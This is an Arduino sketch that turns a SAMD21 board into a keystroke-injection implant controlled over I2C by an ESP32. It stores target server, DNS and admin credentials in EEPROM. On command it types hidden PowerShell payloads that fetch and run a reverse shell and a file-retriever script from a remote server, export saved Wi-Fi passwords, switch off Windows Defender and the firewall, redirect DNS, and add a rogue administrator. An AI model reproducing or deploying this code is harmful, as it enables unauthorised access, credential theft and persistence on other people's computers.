#include <Wire.h>
#include <Keyboard.h>
#include <EEPROM.h>

// Define constants
const int I2C_MASTER_ADDR = 0x08; // I2C address of the ESP32 (master board)
const int ledPin = 13;            // Pin for LED indication

// EEPROM addresses for storing variables
#define SERVER_ADDR 0
#define PORT_ADDR 100
#define PASSWORD_ADDR 200
#define USERNAME_ADDR 300
#define DNS1_ADDR 400
#define DNS2_ADDR 500
#define ADMIN_USER_ADDR 600
#define ADMIN_PASS_ADDR 700

// Variable storage
String server = "";
String port = "";
String password = "";
String username = "";
String dns_server1 = "";
String dns_server2 = "";
String admin_username = "";
String admin_password = "";

// Function to write a string to EEPROM
void writeStringToEEPROM(int addrOffset, const String &strToWrite) {
  int len = strToWrite.length();
  EEPROM.write(addrOffset, len);
  for (int i = 0; i < len; i++) {
    EEPROM.write(addrOffset + 1 + i, strToWrite[i]);
  }
}

// Function to read a string from EEPROM
String readStringFromEEPROM(int addrOffset) {
  int len = EEPROM.read(addrOffset);
  char data[len + 1];
  for (int i = 0; i < len; i++) {
    data[i] = EEPROM.read(addrOffset + 1 + i);
  }
  data[len] = '\0';
  return String(data);
}

void setup() {
  Wire.begin(I2C_MASTER_ADDR);  // Initialize I2C as slave
  Keyboard.begin();             // Initialize the Keyboard library
  Wire.onReceive(receiveEvent); // Register the receive event handler
  Serial.begin(115200);         // Initialize Serial for debugging

  // Load variables from EEPROM
  server = readStringFromEEPROM(SERVER_ADDR);
  port = readStringFromEEPROM(PORT_ADDR);
  password = readStringFromEEPROM(PASSWORD_ADDR);
  username = readStringFromEEPROM(USERNAME_ADDR);
  dns_server1 = readStringFromEEPROM(DNS1_ADDR);
  dns_server2 = readStringFromEEPROM(DNS2_ADDR);
  admin_username = readStringFromEEPROM(ADMIN_USER_ADDR);
  admin_password = readStringFromEEPROM(ADMIN_PASS_ADDR);

  Serial.println("SAMD21 ready to receive commands over I2C");
}

void loop() {
  // The loop is empty because all the work is done in the receiveEvent function
}

void receiveEvent(int bytes) {
  String command = "";
  while (Wire.available()) {
    char c = Wire.read();
    command += c;
  }
  Serial.println("Received command: " + command);
  executeCommand(command);
}

void executeCommand(String command) {
  if (command.startsWith("SET_SERVER=")) {
    String value = command.substring(11);
    server = value;
    writeStringToEEPROM(SERVER_ADDR, server);
    Serial.print("Server set to: ");
    Serial.println(server);
  }
  else if (command.startsWith("SET_PORT=")) {
    String value = command.substring(9);
    port = value;
    writeStringToEEPROM(PORT_ADDR, port);
    Serial.print("Port set to: ");
    Serial.println(port);
  }
  else if (command.startsWith("SET_PASSWORD=")) {
    String value = command.substring(13);
    password = value;
    writeStringToEEPROM(PASSWORD_ADDR, password);
    Serial.println("Password set");
  }
  else if (command.startsWith("SET_USERNAME=")) {
    String value = command.substring(13);
    username = value;
    writeStringToEEPROM(USERNAME_ADDR, username);
    Serial.println("Username set");
  }
  else if (command.startsWith("SET_DNS1=")) {
    String value = command.substring(9);
    dns_server1 = value;
    writeStringToEEPROM(DNS1_ADDR, dns_server1);
    Serial.print("DNS Server 1 set to: ");
    Serial.println(dns_server1);
  }
  else if (command.startsWith("SET_DNS2=")) {
    String value = command.substring(9);
    dns_server2 = value;
    writeStringToEEPROM(DNS2_ADDR, dns_server2);
    Serial.print("DNS Server 2 set to: ");
    Serial.println(dns_server2);
  }
  else if (command.startsWith("SET_ADMIN_USER=")) {
    String value = command.substring(15);
    admin_username = value;
    writeStringToEEPROM(ADMIN_USER_ADDR, admin_username);
    Serial.println("Admin username set");
  }
  else if (command.startsWith("SET_ADMIN_PASS=")) {
    String value = command.substring(15);
    admin_password = value;
    writeStringToEEPROM(ADMIN_PASS_ADDR, admin_password);
    Serial.println("Admin password set");
  }
  else if (command == "RS")
  { // Reverse Shell
    openPowerShell();
    Serial.println(command);
    String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://" + String(server) + "/reverse_shell.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
    Keyboard.println(payload);
  }
  else if (command == "FR")
  { // File Retriever
    openPowerShell();
    Serial.println(command);
    String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://" + String(server) + "/file_retriever.ps1' -OutFile 'C:\\Users\\Public\\file_retriever.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\file_retriever.ps1'\"";
    Keyboard.println(payload);
  }
  else if (command == "DNS")
  { // Set DNS Server
    String payload = "powershell -Command \"Set-DnsClientServerAddress -InterfaceAlias 'Wi-Fi' -ServerAddresses '" + String(dns_server1) + "', '" + String(dns_server2) + "'\"";
    killall();
    openPowerShellAdmin();
    // openPowerShell();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "Wpass")
  { // Retrieve Wi-Fi Passwords
    String payload = "netsh wlan export profile key=clear folder=C:\\temp";
    openPowerShell();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "Ddefender")
  { // Disable Windows Defender
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true;\"";
    killall();
    openPowerShellAdmin();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "Dfirewall")
  { // Disable Windows Firewall
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"netsh advfirewall set allprofiles state off;\"";
    killall();
    openPowerShellAdmin();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "NewAdmin")
  { // Create a new admin user
    String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"net user " + String(admin_username) + " " + String(admin_password) + " /add; net localgroup administrators " + String(admin_username) + " /add;\"";
    killall();
    openPowerShellAdmin();
    Serial.println(command);
    Keyboard.println(payload);
  }
  else if (command == "None")
  {
    for (int i = 0; i < 10; i++)
    {
      digitalWrite(LED_BUILTIN, HIGH);
      delay(50);
      digitalWrite(LED_BUILTIN, LOW);
      delay(50);
    }
    digitalWrite(LED_BUILTIN, LOW);
  }
  else
  {
    Serial.println("Invalid command");
    for (int i = 0; i < 10; i++)
    {
      digitalWrite(LED_BUILTIN, HIGH);
      delay(250);
      digitalWrite(LED_BUILTIN, LOW);
      delay(250);
    }
    digitalWrite(LED_BUILTIN, LOW);
  }
  // Add more commands as needed
}

// Response function (To be implemented):
// void sendResponse(String response) {
//   Wire.beginTransmission(I2C_MASTER_ADDR);
//   Wire.write(response.c_str(), response.length());
//   Wire.endTransmission();
//   Serial.println("Sent response to ESP32C6: " + response);
// }
